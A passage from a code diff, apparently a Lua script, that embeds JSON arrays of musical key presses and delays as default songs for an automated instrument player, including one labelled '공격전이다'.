+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key1E", "delay": 0.375},
+  {"key": "Key2E", "delay": 0.125},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key1D", "delay": 0.25},
+  {"key": "Key2Fsharp", "delay": 0.25},
+  {"key": "Key1D", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Fsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Fsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Fsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2Fsharp", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.125},
+  {"key": "Key2Fsharp", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key3B", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.125},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.125},
+  {"key": "Key1Fsharp", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key1E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key1D", "delay": 0.125},
+  {"key": "Key3B", "delay": 0.125},
+  {"key": "Key1D", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.375},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.375},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key1Fsharp", "delay": 0.25},
+  {"key": "Key1Fsharp", "delay": 0.25},
+  {"key": "Key1Fsharp", "delay": 0.375},
+  {"key": "Key3A", "delay": 0.125},
+  {"key": "Key1Fsharp", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key1Fsharp", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key1E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key1D", "delay": 0.375},
+  {"key": "Key2E", "delay": 0.125},
+  {"key": "Key1D", "delay": 0.25},
+  {"key": "Key2Fsharp", "delay": 0.25},
+  {"key": "Key1D", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.24992},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115384},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115384},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115384},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115384},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115384},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key3B", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key3B", "delay": 0.115384},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key3B", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key3B", "delay": 0.115384},
+  {"key": "Key1Fsharp", "delay": 0.230769},
+  {"key": "Key2E", "delay": 0.230769},
+  {"key": "Key2E", "delay": 0.230769},
+  {"key": "Key1E", "delay": 0.230769},
+  {"key": "Key2D", "delay": 0.230769},
+  {"key": "Key2D", "delay": 0.230769},
+  {"key": "Key1D", "delay": 0.115384},
+  {"key": "Key3B", "delay": 0.115385},
+  {"key": "Key1D", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3B", "delay": 0.230769},
+  {"key": "Key3B", "delay": 0.461538},
+  {"key": "Key3A", "delay": 0.461538},
+  {"key": "Key3A", "delay": 0.461538},
+  {"key": "Key3B", "delay": 0.461538},
+  {"key": "Key3B", "delay": 0.461538},
+  {"key": "Key3A", "delay": 0.461538},
+  {"key": "Key3A", "delay": 0.461538},
+  {"key": "Key3B", "delay": 0.461538},
+  {"key": "Key3B", "delay": 0.461538},
+  {"key": "Key2E", "delay": 0.461538},
+  {"key": "Key2E", "delay": 0.230769},
+  {"key": "Key2E", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2E", "delay": 0.230769},
+  {"key": "Key2D", "delay": 0.230769},
+  {"key": "Key2E", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.923076},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115384},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key1G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key1G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115384},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2D", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115384},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key1G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1Fsharp", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115384},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1Fsharp", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key1Fsharp", "delay": 0.230769},
+  {"key": "Key1Fsharp", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115384},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key1G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115384},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115384},
+  {"key": "Key1G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2B", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2D", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key1G", "delay": 0.230769},
+  {"key": "Key1G", "delay": 0.115384},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1Fsharp", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key1Fsharp", "delay": 0.115385},
+  {"key": "Key3A", "delay": 0.115384},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key1Fsharp", "delay": 0.230769},
+  {"key": "Key1Fsharp", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.576922},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.576922},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2D", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.115384},
+  {"key": "Key2G", "delay": 0.576922},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.115384},
+  {"key": "Key2G", "delay": 0.576923},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.576922},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.576922},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2D", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.576922},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.576923},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.576922},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.115385},
+  {"key": "Key2Fsharp", "delay": 0.576922},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2D", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.115385},
+  {"key": "Key2G", "delay": 0.576923},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key2Fsharp", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.230769},
+  {"key": "Key3A", "delay": 0.230769},
+  {"key": "Key2G", "delay": 0.115385}
+]
+]]
+
+    -- ========================================================================
+    -- デフォルト曲：공격전이다
+    -- ========================================================================
+    local DEFAULT_SONG_GONGKYEOKJEON = [[
+[
+  {"key": "Key1C", "delay": 1},
+  {"key": "Key1D", "delay": 0.25},
+  {"key": "Key1E", "delay": 0.5},
+  {"key": "Key1C", "delay": 2},
+  {"key": "Key1D", "delay": 0.25},
+  {"key": "Key1E", "delay": 0.5},
+  {"key": "Key1F", "delay": 0.5},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key2A", "delay": 0.5},
+  {"key": "Key2A", "delay": 1.5},
+  {"key": "Key1G", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1E", "delay": 0.25},
+  {"key": "Key1E", "delay": 0.5},
+  {"key": "Key2A", "delay": 0.5},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.75},
+  {"key": "Key2B", "delay": 0.5},
+  {"key": "Key2A", "delay": 0.5},
+  {"key": "Key1C", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key1D", "delay": 0.25},
+  {"key": "Key1C", "delay": 0.5},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 1.25},
+  {"key": "Key2Fsharp", "delay": 0.25},
+  {"key": "Key2Gsharp", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2E", "delay": 4},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2A", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2A", "delay": 0.25},
+  {"key": "Key2C", "delay": 1.5},
+  {"key": "Key2D", "delay": 0.125},
+  {"key": "Key2E", "delay": 0.125},
+  {"key": "Key2F", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2E", "delay": 1},
+  {"key": "Key3A", "delay": 1},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2F", "delay": 1.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3A", "delay": 2.25},
+  {"key": "Key2B", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.75},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2B", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2F", "delay": 4.75},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2A", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key1E", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2A", "delay": 0.25},
+  {"key": "Key2C", "delay": 1.5},
+  {"key": "Key2D", "delay": 0.125},
+  {"key": "Key2E", "delay": 0.125},
+  {"key": "Key2F", "delay": 0.125},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2E", "delay": 1},
+  {"key": "Key3A", "delay": 1},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2F", "delay": 1.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key3A", "delay": 2.25},
+  {"key": "Key2B", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.75},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key2Dsharp", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2B", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.75},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3B", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key2C", "delay": 2},
+  {"key": "Key2D", "delay": 0.0625},
+  {"key": "Key2E", "delay": 0.0625},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key2C", "delay": 1.75},
+  {"key": "Key2D", "delay": 0.0625},
+  {"key": "Key2E", "delay": 0.0625},
+  {"key": "Key2G", "delay": 0.125},
+  {"key": "Key1D", "delay": 0.25},
+  {"key": "Key1C", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key1C", "delay": 0.25},
+  {"key": "Key1C", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key1C", "delay": 0.25},
+  {"key": "Key2G", "delay": 0.25},
+  {"key": "Key1C", "delay": 0.25},
+  {"key": "Key1C", "delay": 0.5},
+  {"key": "Key1C", "delay": 0.5},
+  {"key": "Key2F", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2D", "delay": 0.5},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key1C", "delay": 0.5},
+  {"key": "Key1C", "delay": 0.5},
+  {"key": "Key1C", "delay": 0.5},
+  {"key": "Key2A", "delay": 0.75},
+  {"key": "Key2C", "delay": 0.5},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.25},
+  {"key": "Key1C", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.25},
+  {"key": "Key1F", "delay": 0.5},
+  {"key": "Key3C", "delay": 0.25},
+  {"key": "Key3B", "delay": 0.25},
+  {"key": "Key1E", "delay": 0.5},
+  {"key": "Key1E", "delay": 0.5},
+  {"key": "Key1E", "delay": 0.5},
+  {"key": "Key1E", "delay": 0.5},
+  {"key": "Key1E", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.5},
+  {"key": "Key2Fsharp", "delay": 0.5},
+  {"key": "Key2Gsharp", "delay": 0.5},
+  {"key": "Key3A", "delay": 0.5},
+  {"key": "Key1E", "delay": 0.5},
+  {"key": "Key2A", "delay": 0.5},
+  {"key": "Key2B", "delay": 0.25},
+  {"key": "Key2C", "delay": 0.25},
+  {"key": "Key2D", "delay": 0.25},
+  {"key": "Key2E", "delay": 0.25},
+  {"key": "Key1D", "delay": 0.5},
